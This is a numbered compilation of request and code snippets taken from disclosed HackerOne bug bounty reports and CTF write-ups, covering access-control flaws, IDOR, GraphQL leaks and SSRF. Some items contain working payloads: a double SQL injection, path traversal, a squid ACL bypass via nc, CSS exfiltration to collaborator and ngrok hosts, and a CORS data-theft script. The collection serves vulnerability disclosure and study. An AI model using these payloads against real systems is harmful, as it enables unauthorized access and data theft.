## 152. [#1069396](https://hackerone.com/reports/1069396)  -  Hackyholidays [ h1-ctf] writeup [mission:- stop the grinch ]
*critical*

```
And visited -  https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkvIiwiYXV0aCI6Ijc2YmEwNjFkMzU2YzYyNjRhNjAwNTIxNmUxNzc2YmE2In0=

**Response**

invalid authentication hash

+ At this point, I was like how we can exploit the functionality, in order to do that, we have to generate a valid hash for the output.

+ So, I was being with no luck and then, visited hacker101 discord channel where adam posted a hint for "inception image".

+ After I tried SQL injection on album parameter to check whether it's a SQL injection case or not, however, it was:

**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%202,NULL,%22aaa%22--%20-

**Response**

+ In the response, it was returning the album column along with images.

{F1139795}

+ It means select 2 means it was selecting album column and then, it struck about adam's inception hint.

+ In the movie inception, we get the dream inside a dream.

+ Thus, if we are selecting the album column and getting the output, thus there might be a chance of double SQL injection where we can select the photo id and if we somehow add the photo id as a random value, then it might generate valid auth hash from the server.

+ After different testing , finally got the double SQL injection.

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/\%22--%20-%22,NULL,%22aaa%27%22--%20-

**Response**

+ In response, we get the image as:
# … truncated …
```

## 153. [#894174](https://hackerone.com/reports/894174)  -  [H1-2006 2020] In-depth resolution of the h1-2006 CTF
*critical*

```javascript
$(".upgradeToAdmin").click(function() {
    let t = $(input[name=username]).val();
    $.get("/admin/upgrade?username=" + t, function() {
        alert("User Upgraded to Admin")
    })
})


$(".tab").click(function() {
    return $(".tab").removeClass("active"), $(this).addClass("active"), $("div.content").addClass("hidden"), $("div.content-" + $(this).attr("data-target")).removeClass("hidden"), !1
})

$(".sendReport").click(function() {
    $.get("/admin/report?url=" + url, function() {
        alert("Report sent to admin team")
    }), $("#myModal").modal("hide")
})

document.location.hash.length > 0 && ("#tab1" === document.location.hash && $(".tab1").trigger("click"), "#tab2" === document.location.hash && $(".tab2").trigger("click"), "#tab3" === document.location.hash && $(".tab3").trigger("click"), "#tab4" === document.location.hash && $(".tab4").trigger("click"));
```

## 154. [#2208647](https://hackerone.com/reports/2208647)  -  CVE-2023-42780: Apache Airflow: Improper access control vulnerability in the "List dag warnings" feature
*low, $540*

```http
GET /api/v1/dagWarnings HTTP/1.1
Host: testvul.com:8080
content-type: application/json
Referer: http://testvul.com:8080/dags/example_external_task_marker_parent/grid
Cookie: session=6ba0ebcd-94b6-41e9-8143-2ada52d554b1.IGPZy1m5c8235p5r8qo4GhPl_YM
Content-Length: 0
```

## 155. [#357485](https://hackerone.com/reports/357485)  -  Hacktivity of a private program visible to banned user if he gets invited to a program by hackbot
*low, $500*

```http
GET /hacktivity?sort_type=latest_disclosable_activity_at&page=1&filter=type%3Aall%20to%3A██████████&range=forever HTTP/1.1
Host: hackerone.com
X-CSRF-Token: REDACTED
X-Requested-With: XMLHttpRequest
Content-Type: application/json
Referer: https://hackerone.com/REDACTED/hacktivity
Cookie: REDACTED
```

## 156. [#357485](https://hackerone.com/reports/357485)  -  Hacktivity of a private program visible to banned user if he gets invited to a program by hackbot
*low, $500*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Content-Length: 1250
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/REDACTED
Cookie: REDACTED

{"query":"query Team_assets($first_0:Int!,$first_1:Int!) {\n  query {\n    id,\n    ...F0\n  }\n}\nfragment F0 on Query {\n  me {\n    _membership3abeOl:membership(team_handle:\"██████\") {\n      permissions,\n      id\n    },\n    id\n  },\n  _team3p4BfA:team(handle:\"███\") {\n    handle,\n    _structured_scopes2tadtg:structured_scopes(first:$first_0,archived:false) {\n      max_updated_at\n    },\n    _structured_scopes2tzyk4:structured_scopes(first:$first_1,archived:false,eligible_for_submission:true) {\n      edges {\n        node {\n          id,\n          asset_type,\n          asset_identifier,\n          rendered_instruction,\n          max_severity,\n          eligible_for_bounty\n        },\n        cursor\n      },\n      pageInfo {\n        hasNextPage,\n        hasPreviousPage\n      }\n    },\n    _structured_scopes1j7lgN:structured_scopes(first:$first_1,archived:false,eligible_for_submission:false) {\n      edges {\n        node {\n          id,\n          asset_type,\n          asset_identifier,\n          rendered_instruction\n        },\n        cursor\n      },\n      pageInfo {\n        hasNextPage,\n        hasPreviousPage\n      }\n    },\n    id\n  },\n  id\n}","variables":{"first_0":100,"first_1":50}}
# … truncated …
```

## 157. [#357485](https://hackerone.com/reports/357485)  -  Hacktivity of a private program visible to banned user if he gets invited to a program by hackbot
*low, $500*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Content-Length: 496
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/REDACTED/updates
Cookie: REDACTED

{"query":"query Team_posts($first_0:Int!) {\n  query {\n    id,\n    ...F0\n  }\n}\nfragment F0 on Query {\n  _teamhn8Kp:team(handle:\"█████████\") {\n    _posts3y3M77:posts(first:$first_0) {\n      total_count,\n      edges {\n        node {\n          id,\n          created_at,\n          markdown_message,\n          title\n        },\n        cursor\n      },\n      pageInfo {\n        hasNextPage,\n        hasPreviousPage\n      }\n    },\n    id\n  },\n  id\n}","variables":{"first_0":100}}
```

## 158. [#357485](https://hackerone.com/reports/357485)  -  Hacktivity of a private program visible to banned user if he gets invited to a program by hackbot
*low, $500*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Content-Length: 1250
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/REDACTED
```

## 159. [#357485](https://hackerone.com/reports/357485)  -  Hacktivity of a private program visible to banned user if he gets invited to a program by hackbot
*low, $500*

```http
POST /graphql HTTP/1.1
Host: hackerone.com
Content-Length: 496
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/REDACTED/updates
```

## 160. [#528940](https://hackerone.com/reports/528940)  -  STAFF member with NO Explicit permissions can view `ActivityFeed` via GraphQL
*low, $500*

```http
POST /admin/api/graphql HTTP/1.1
Host: bir1.myshopify.com
content-type: application/json
Origin: https://bir1.myshopify.com
Content-Length: 577

{"operationName":"ActivityFeed","variables":{"first":20},"query":"query ActivityFeed($first: Int!) {\n  staffMember {\n    id\n    privateData {\n      activityFeed(first: $first) {\n        pageInfo {\n          hasNextPage\n          __typename\n        }\n        edges {\n          ...Activity\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment Activity on ActivityEdge {\n  cursor\n  node {\n    author\n    createdAt\n    messages\n    topic\n    attributed\n    __typename\n  }\n  __typename\n}\n"}
```

## 161. [#1615790](https://hackerone.com/reports/1615790)  -  Any expired reset password link can still be used to reset the password
*low, $100*

```http
POST /TokenValidation.aspx HTTP/2
Host: alt.5nine.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 405

__VIEWSTATE=<viewstate-here>&ctl00%24mainContentId%24Password=hacked123&ctl00%24mainContentId%24ConfirmPassword=hacked123&ctl00%24mainContentId%24FinalizeRegistration=Submit
```

## 162. [#1084865](https://hackerone.com/reports/1084865)  -  [h1-2102] [Oberlo] Least privileged user can cancel account owner's subscription via POST on  /payments/subscribe
*low*

```http
POST /payments/subscribe HTTP/1.1
Host: app.oberlo.com
Content-Length: 19
```

## 163. [#1841408](https://hackerone.com/reports/1841408)  -  Error in  Booking an appointment reveals the full path of the website
*low*

```http
POST /index.php/apps/calendar/appointment/9/book HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 138
Origin: http://129.146.173.97
Cookie:<any valid-cookie>

{"start":1674205200,"end":1674205500,"displayName":"attackerbikram","email":"ohp@gmail.com","description":"","timeZone":"UTC"}
```

## 164. [#608656](https://hackerone.com/reports/608656)  -  Disabled account can still use GraphQL endpoint
*low*

```http
POST /graphql? HTTP/1.1
Host: hackerone.com
Content-Length: 394
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/settings/disabled/edit
Cookie: ...

{"query":"query Sessions_page($first_0:Int!) {me {id,...F1}} fragment F0 on UserSession {id} fragment F1 on User {_sessionssvoGn:sessions(first:$first_0) {total_count,pageInfo {hasNextPage,hasPreviousPage},edges {node {id,ip_address,user_agent,abbreviated_user_agent,country {name,flag,id},session_last_used_at,deactivated_at,device_type,current,...F0},cursor}},id}","variables":{"first_0":10}}
```

## 165. [#608656](https://hackerone.com/reports/608656)  -  Disabled account can still use GraphQL endpoint
*low*

```http
POST /graphql? HTTP/1.1
Host: hackerone.com
Content-Length: 1322
Origin: https://hackerone.com
Content-Type: application/json
Referer: https://hackerone.com/settings/disabled/edit
Cookie: ...

{"query":"query User_programs_settings_page($first_0:Int!,$first_3:Int!,$size_1:ProfilePictureSizes!,$size_2:ProfilePictureSizes!) {me {id,...Fb}} fragment F0 on Team {_profile_picture1Fh783:profile_picture(size:$size_2),name,handle,submission_state,triage_active,state,external_program {id},id} fragment F1 on TeamMember {id} fragment F2 on TeamMember {id,auto_subscribe,...F1} fragment F3 on TeamMember {id,i_can_leave_team,...F1} fragment F4 on TeamMember {id,concealed,user {triage_user,id},...F1} fragment F5 on TeamMember {id,auto_subscribe,team {id,_id,handle,name,_profile_picturePkPpF:profile_picture(size:$size_1),...F0},...F2,...F3,...F4} fragment F6 on Team {id,handle,subscribed} fragment F7 on User {id} fragment F8 on User {id,...F7} fragment F9 on User {id,...F8} fragment Fa on User {username,_memberships33GCss:memberships(first:$first_0) {total_count,edges {node {id,...F5},cursor},pageInfo {hasNextPage,hasPreviousPage}},_team_policy_subscriptions40Jg2O:team_policy_subscriptions(first:$first_3,active:true) {edges {node {id,team {id,handle,name,_profile_picture1Fh783:profile_picture(size:$size_2),subscribed,...F6,...F0},source_type},cursor},pageInfo {hasNextPage,hasPreviousPage}},id,...F9} fragment Fb on User {id,...Fa}","variables":{"first_0":500,"first_3":25,"size_1":"small","size_2":"medium"}}
# … truncated …
```

## 166. [#802011](https://hackerone.com/reports/802011)  -  Grafana Improper authorization
*low*

```http
GET /api/datasources/proxy/4/query?db=metrics&q=SELECT%20%0A%20%201-(sum(%22consistent_builds%22)%2Fsum(%22builds%22))%0AFROM%0A%20%20%22flakes_daily%22%20%0AWHERE%20%0A%20%20time%20%3E%20now()%20-%2030d%0A%20%20AND%20%22job%22%20%3D~%20%2F%5E(pr%3Apull-kubernetes-kubemark-e2e-gce-big%7Cpr%3Apull-kubernetes-bazel-build%7Cpr%3Apull-kubernetes-bazel-test%7Cpr%3Apull-kubernetes-dependencies%7Cpr%3Apull-kubernetes-e2e-gce%7Cpr%3Apull-kubernetes-e2e-gce-100-performance%7Cpr%3Apull-kubernetes-e2e-kind%7Cpr%3Apull-kubernetes-integration%7Cpr%3Apull-kubernetes-node-e2e%7Cpr%3Apull-kubernetes-typecheck%7Cpr%3Apull-kubernetes-verify)%24%2F%0Agroup%20by%20job%2C%20time(20m)%20fill(none)&epoch=ms HTTP/1.1
Host: velodrome.k8s.io
Referer: http://velodrome.k8s.io/dashboard/db/job-health-merge-blocking?orgId=1
```

## 167. [#1960107](https://hackerone.com/reports/1960107)  -  Rider can forcefully get passenger's order accepted resulting in multiple impacts including PII reveal  and more mentioned in the report.
*high*

```bash
curl https://terra-akamai.indriverapp.com/api/setTenderStatus?cid=5957&locale=en_US&phone=████&token=████████&v=7&stream_id=1682280490209367&tender_id=████████&order_id=█████████&status=accept
```

## 168. [#1960107](https://hackerone.com/reports/1960107)  -  Rider can forcefully get passenger's order accepted resulting in multiple impacts including PII reveal  and more mentioned in the report.
*high*

```bash
curl https://terra-akamai.indriverapp.com/api/driverrequest?cid=5957&locale=en_US&job_id=338f72ff-f3c1-4da0-af15-5d1aa720146b&phone=██████████&token=████████&v=7&stream_id=1682279074257167&order_id=██████&client_id=█████████&shield_session_id=██████████&type=indriver&price=63&period=3&geo_arrival_time=1&distance=5&longitude=85.3249627&latitude=27.7390611&sn=1
```

## 169. [#1192460](https://hackerone.com/reports/1192460)  -  A deactivated user can access data through GraphQL
*medium*

```bash
curl --header "Authorization: Bearer <<ADMIN TOKEN>>" "https://gitlab.domain.com/api/v4/projects//members" --data "user_id=2&access_level=40"
```

## 170. [#1372216](https://hackerone.com/reports/1372216)  -  IDOR in "external status check" API leaks data about any status check on the instance
*medium*

```bash
curl --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=a&external_status_check_id=2' \
  --header 'Authorization: Bearer <TOKEN>'
```

## 171. [#1372216](https://hackerone.com/reports/1372216)  -  IDOR in "external status check" API leaks data about any status check on the instance
*medium*

```bash
curl --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=<SHA>&external_status_check_id=2' \
  --header 'Authorization: Bearer <TOKEN>'
```

## 172. [#1372216](https://hackerone.com/reports/1372216)  -  IDOR in "external status check" API leaks data about any status check on the instance
*medium*

```bash
curl --request POST \
  --url 'https://gitlab.domain.com/api/v4/projects/<ATTACKID>/merge_requests/1/status_check_responses?sha=<SHA>&external_status_check_id=1' \
  --header 'Authorization: Bearer <TOKEN>'
```

## 173. [#2442008](https://hackerone.com/reports/2442008)  -  Attachment disclosure via summary report
*critical*

```http
PUT /reports/████/summaries/███████ HTTP/2
Host: hackerone.com
```

## 174. [#824802](https://hackerone.com/reports/824802)  -  URN Request bypass ACL Checks
*critical*

```
echo -e "GET urn::@127.0.0.1:8080/hello.html? HTTP/1.1\r\n\r\n" |nc <squid hostname> 3128

HTTP/1.1 302 Found
Server: squid/4.8
Mime-Version: 1.0
Date: Thu, 19 Mar 2020 18:11:20 GMT
Content-Type: text/html
Content-Length: 460
Expires: Thu, 19 Mar 2020 18:11:20 GMT
Location: 	Notice: For localhost only
X-Cache: MISS from g64
Via: 1.1 g64 (squid/4.8)
Connection: keep-alive

<TITLE>Select URL for urn::@127.0.0.1:8080/hello.html?</TITLE>
<STYLE type="text/css"><!--BODY{background-color:#ffffff;font-family:verdana,sans-serif}--></STYLE>
<H2>Select URL for urn::@127.0.0.1:8080/hello.html?</H2>
<TABLE BORDER="0" WIDTH="100%">
<TR><TD><A HREF="	Notice: For localhost only">	Notice: For localhost only</A></TD><TD align="right">Unknown</TD><TD> </TD></TR>
</TABLE><HR noshade size="1px">
<ADDRESS>
Generated by squid/4.8@g64
</ADDRESS>
```

## 175. [#824802](https://hackerone.com/reports/824802)  -  URN Request bypass ACL Checks
*critical*

```http
GET urn::@localhost:3128/squid-internal-mgr/active_requests? HTTP/1.1

Below is the CacheManager getting accessed via this:
```

## 176. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /.git/config HTTP/1.1
Host: app.bountypay.h1ctf.com
```

## 177. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /bp_web_trace.log HTTP/1.1
Host: app.bountypay.h1ctf.com
```

## 178. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com

username=brian.oliver&password=V7h0inzX
```

## 179. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded

username=brian.oliver&password=V7h0inzX&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
```

## 180. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /statements?month=04&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyIsImhhc2giOiJkZTIzNWJmZmQyM2RmNjk5NWFkNGUwOTMwYmFhYzFhMiJ9
```

## 181. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /statements?month=05&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Cookie: token=eyJhY2NvdW50X2lkIjoiRjhnSGlxU2RwSyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY5OTVhZDRlMDkzMGJhYWMxYTIifQ==
```

## 182. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /statements?month=05&year=2020 HTTP/1.1
Host: app.bountypay.h1ctf.com
Cookie: token=eyJhY2NvdW50X2lkIjoiLi4vLi4vcmVkaXJlY3Q/dXJsPWh0dHBzOi8vc29mdHdhcmUuYm91bnR5cGF5LmgxY3…
```

## 183. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /api/accounts/F8gHiqSdpK/statements?month=05&year=2020 HTTP/1.1
Host: api.bountypay.h1ctf.com
```

## 184. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
```

## 185. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
```

## 186. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded

staff_id=STF:KE624RQ2T9
```

## 187. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
POST /api/staff HTTP/1.1
Host: api.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded

staff_id=STF:8FJ3KFISL3
```

## 188. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /js/website.js HTTP/1.1
	Host: staff.bountypay.h1ctf.com
	Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNb…
```

## 189. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /admin/upgrade?username=sandra.allison HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwSmVNbF…
```

## 190. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
GET /admin/report?url=Lz90ZW1wbGF0ZT10aWNrZXQmdGlja2V0X2lkPTM1ODIjdGFiNA== HTTP/1.1
Host: staff.bountypay.h1ctf.com
Cookie: token=c0lsdUVWbXlwYnp5L1VuMG5qcGdMZnlPTm9iQjhhbzhweEtKaFFCZGhSVHBnMVNDWHlsVkRKclJqcnIwR09NOV…
```

## 191. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
POST / HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded

username=marten.mickos&password=h%26H5wy2Lggj*kKn4OD%26Ype&challenge=5828c689761cce705a1c84d9b1a1ed5e&challenge_answer=bD83Jk27dQ
```

## 192. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https%3A%2F%2Fwww.bountypay.h1ctf.com%2Fcss%2Funi_2fa_style.css
```

## 193. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```http
POST /pay/17538771/27cd1393c170e1e97f9507a5351ea1ba HTTP/1.1
Host: app.bountypay.h1ctf.com
Content-Type: application/x-www-form-urlencoded
Cookie: token=eyJhY2NvdW50X2lkIjoiQWU4aUpMa245eiIsImhhc2giOiIzNjE2ZDZiMmMxNWU1MGMwMjQ4YjIyNzZiNDg0ZGRiMiJ9

app_style=https://u1w9neu3o71nmwn6ryh9o7zbg2msah.burpcollaborator.net/css/uni_2fa_style.css
```

## 194. [#1067912](https://hackerone.com/reports/1067912)  -  A Visit from The Grinch ~ 'Twas the night before Hackmas...
*critical*

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
```

## 195. [#894174](https://hackerone.com/reports/894174)  -  [H1-2006 2020] In-depth resolution of the h1-2006 CTF
*critical*

```http
post = {'app_style': 'https%3A%2F%2F4291e5a07787.ngrok.io%2Fselector.css'}
```

## 196. [#1262434](https://hackerone.com/reports/1262434)  -  Theme editor `oseid` parameter is leaked to third-party services through the `Referer` header which leads to somekind of storefront password bypass.
*low, $500*

```javascript
let shopHandle = 'victim-shop', oseid = 'oseid-1234';

	const iframe = document.createElement('iframe');	
	iframe.src = `https://${shopHandle}.myshopify.com/?oseid=${oseid}`;
	iframe.height = window.innerHeight;
	iframe.width = window.innerWidth;
	iframe.style.position = 'absolute';
	iframe.style.zIndex = '9001';
	iframe.style.top = iframe.style.left = 0; 

	document.querySelector('body').appendChild(iframe);
```

## 197. [#792927](https://hackerone.com/reports/792927)  -  Email address of any user can be queried on Report Invitation GraphQL type when username is known
*high*

```http
POST /graphql HTTP/1.1

'''{"query":"mutation Revoke_credential_mutation($input_0:AddReportParticipantInput!) {addReportParticipant(input:$input_0) {clientMutationId,...F1}}  fragment F1 on AddReportParticipantPayload {clientMutationId,was_successful,errors{nodes{message}},invitation{email,token}}","variables":{"input_0":{"report_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82MjYzNzE=","email":"██████████","username":"jobert"}}}``
```

## 198. [#1969141](https://hackerone.com/reports/1969141)  -  Insecure Direct Object Reference (IDOR) - Delete Campaigns
*high*

```http
POST /graphql HTTP/2
Host: hackerone.com
Cookie: yourcookie
Referer: https://hackerone.com/organizations/opensea_demo/campaigns/242/edit
Content-Type: application/json
X-Csrf-Token: ███
```

## 199. [#3081691](https://hackerone.com/reports/3081691)  -  1 Click Account Takeover via Auth Token Theft on marketing.hostinger.com
*high*

```http
POST /hpanel/auth/auth-token HTTP/2
Host: builder-backend.hostinger.com
Origin: https://builder.hostinger.com
```

## 200. [#1034346](https://hackerone.com/reports/1034346)  -  Security@ email forwarding and Embedded Submission drafts can be used to obtain copy of deleted attachments from other HackerOne users
*high*

```http
POST /80b9bc53-a236-445d-a7e4-553828b7d533/embedded_submissions/draft_sync HTTP/2
Host: hackerone.com

{
  "draft_id": "1",
  "title": "This becomes the new title for draft 1",
  "vulnerability_information":"This becomes the new vulnerability information for draft 1"
}
```

## 201. [#1034346](https://hackerone.com/reports/1034346)  -  Security@ email forwarding and Embedded Submission drafts can be used to obtain copy of deleted attachments from other HackerOne users
*high*

```http
POST /80b9bc53-a236-445d-a7e4-553828b7d533/embedded_submissions/draft_sync HTTP/2
Host: hackerone.com
```

## 202. [#3103755](https://hackerone.com/reports/3103755)  -  Privilege Escalation in Edit and Create Secret Endpoints Leads to Unauthorized Secret Modification
*high*

```http
GET /api/w/[workspace_id]/dust_app_secrets HTTP/2  
Host: dust.tt  
Cookie: [appSession]
```

## 203. [#3103755](https://hackerone.com/reports/3103755)  -  Privilege Escalation in Edit and Create Secret Endpoints Leads to Unauthorized Secret Modification
*high*

```http
POST /api/w/[workspace_id]/dust_app_secrets HTTP/2  
Host: dust.tt  
Content-Type: application/json  
Cookie: [appSession]

{
  "name": "NAME-1",
  "value": "malicious-value"
}
```

## 204. [#3103755](https://hackerone.com/reports/3103755)  -  Privilege Escalation in Edit and Create Secret Endpoints Leads to Unauthorized Secret Modification
*high*

```http
POST /api/w/[workspace_id]/dust_app_secrets HTTP/2  
Host: dust.tt  
Content-Type: application/json  
Cookie: [appSession]

{
```

## 205. [#447930](https://hackerone.com/reports/447930)  -  Embedded submission form UUIDs can be enumerated through GraphQL node interface, exposing sensitive program details
*high*

```http
POST /graphql?embedded_submission_form_uuid=█████████ HTTP/1.1
Host: hackerone.com

{"query":"query { node(id: \"Z2lkOi8vaGFja2Vyb25lL0VtYmVkZGVkU3VibWlzc2lvbkZvcm0vOQ==\") { ... on EmbeddedSubmissionForm { id, uuid team { handle policy } }}}","variables":{}}
```

## 206. [#447930](https://hackerone.com/reports/447930)  -  Embedded submission form UUIDs can be enumerated through GraphQL node interface, exposing sensitive program details
*high*

```http
POST /graphql?embedded_submission_form_uuid=█████████ HTTP/1.1
Host: hackerone.com
```

## 207. [#2212627](https://hackerone.com/reports/2212627)  -  Delete external storage of any user
*high*

```http
PUT /apps/files_external/userstorages/<storage_id> HTTP/1.1
Host: 127.0.0.1:9090

{"mountPoint":"simpleuser","backend":"owncloud","authMechanism":"password::logincredentials","backendOptions":{"host":"cq6xxrdnw1941wu9jk4gcyfuglmfa4.oastify.com","root":"","secure":true},"testOnly":true,"id":<storage_id>,"mountOptions":{"enable_sharing":true,"encoding_compatibility":false,"encrypt":true,"filesystem_check_changes":1,"previews":true,"readonly":false}}
```

## 208. [#2212627](https://hackerone.com/reports/2212627)  -  Delete external storage of any user
*high*

```http
PUT /apps/files_external/userstorages/<storage_id> HTTP/1.1
Host: 127.0.0.1:9090
```

## 209. [#1098793](https://hackerone.com/reports/1098793)  -  Kroki Arbitrary File Read/Write
*high*

```rb
require 'digest'
require 'base64'
require 'zlib'

string = "http://192.168.69.1:8082/plantuml/../../../../../../tmp/test_file_write.txt/eNpLzkksLlZwyslPzg4oyk9OLS7OL-JKBgu6ZCamFyXmguXgQiWJicgCATmJeSWhuTkQMS5UcxRsanR1FTJSM1K5kM2CCCMZhSmJYiwAy8U5sQ=="

p "diag-#{Digest::SHA256.hexdigest test = string}"
```

## 210. [#1848176](https://hackerone.com/reports/1848176)  -  IDOR in TalentMAP API can be abused to enumerate personal information of all the users
*high*

```http
GET /api/v1/permission/user/{USER_ID}/ HTTP/1.1

Host: localhost:8000
```

## 211. [#888729](https://hackerone.com/reports/888729)  -  Read-Only user can delete users
*high*

```http
DELETE /api/invitations/a996881d-7177-43fb-be7c-da3a6b005f40
```

## 212. [#827816](https://hackerone.com/reports/827816)  -  Missing server side controls when editing the board’s sharing permissions per user
*high*

```http
GET /apps/deck/boards HTTP/1.1
Host: next.yy.ee
Cookie: …
```

## 213. [#827816](https://hackerone.com/reports/827816)  -  Missing server side controls when editing the board’s sharing permissions per user
*high*

```http
GET /apps/deck/boards HTTP/1.1
Host: next.yy.ee
```

## 214. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/#
```

## 215. [#895778](https://hackerone.com/reports/895778)  -  [H1-2006] CTF Writeup
*critical*

```
../../redirect?url=https://software.bountypay.h1ctf.com/`
```

## 216. [#372452](https://hackerone.com/reports/372452)  -  CORS on (ws.infogram.com)
*low*

```html
<script>
var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ws.infogram.com/socket.io/?EIO=3&transport=polling&t=MH7BU79',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
</script>
```

## 217. [#1685822](https://hackerone.com/reports/1685822)  -  RepositoryPipeline allows importing of local git repos
*medium, $22,300*

```bash
$ git fetch file://aw.rs/var/opt/gitlab/git-data/repositories/@hashed/b1/74/b174103b399555239923697fbe124faa61de4d441bd5c5678275eb0a5a27a562.git
fatal: '/var/opt/gitlab/git-data/repositories/@hashed/b1/74/b174103b399555239923697fbe124faa61de4d441bd5c5678275eb0a5a27a562.git' does not appear to be a git repository
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.
```

## 218. [#1685822](https://hackerone.com/reports/1685822)  -  RepositoryPipeline allows importing of local git repos
*medium, $22,300*

```javascript
await fetch("/import/bulk_imports.json", { method: "POST", headers: { "X-CSRF-Token": document.querySelector("[name=csrf-token]").content, "Content-Type": "application/json" }, body: `{"bulk_import":[{"source_type":"project_entity","source_full_path":"group1/project1","destination_namespace":"vakzz","destination_slug":"some_project_z_${Math.floor(Math.random() * 10000)}"}]}` });
```

## 219. [#1555502](https://hackerone.com/reports/1555502)  -  Collaborators and Staff members without all necessary permissions are able to create, edit and install custom apps
*medium, $1,900*

```http
POST /admin/internal/web/graphql/core?operation=CreateAppMutation&type=mutation HTTP/2
Host: 19kun-19.myshopify.com
Cookie: <COOKIES_STAFF_MEMBER>
X-Csrf-Token: <CSRF_STAFF_MEMBER>
Origin: https://19kun-19.myshopify.com

{
   "operationName":"CreateAppMutation",
   "variables":{
      "input":{
         "title":"test",
         "maintainerUserId":"gid://shopify/StaffMember/76770345016"
      }
   },
   "query":"mutation CreateAppMutation($input: ShopOwnedAppCreateInput!) {\n  shopOwnedAppCreate(input: $input) {\n    app {\n      id\n      title\n      __typename\n    }\n    userErrors {\n      field\n      message\n      code\n      __typename\n    }\n    __typename\n  }\n}\n"
}
```

## 220. [#1555502](https://hackerone.com/reports/1555502)  -  Collaborators and Staff members without all necessary permissions are able to create, edit and install custom apps
*medium, $1,900*

```http
POST /admin/internal/web/graphql/core?operation=CreateAppMutation&type=mutation HTTP/2
Host: 19kun-19.myshopify.com
Cookie: <COOKIES_STAFF_MEMBER>
X-Csrf-Token: <CSRF_STAFF_MEMBER>
Origin: https://19kun-19.myshopify.com
```

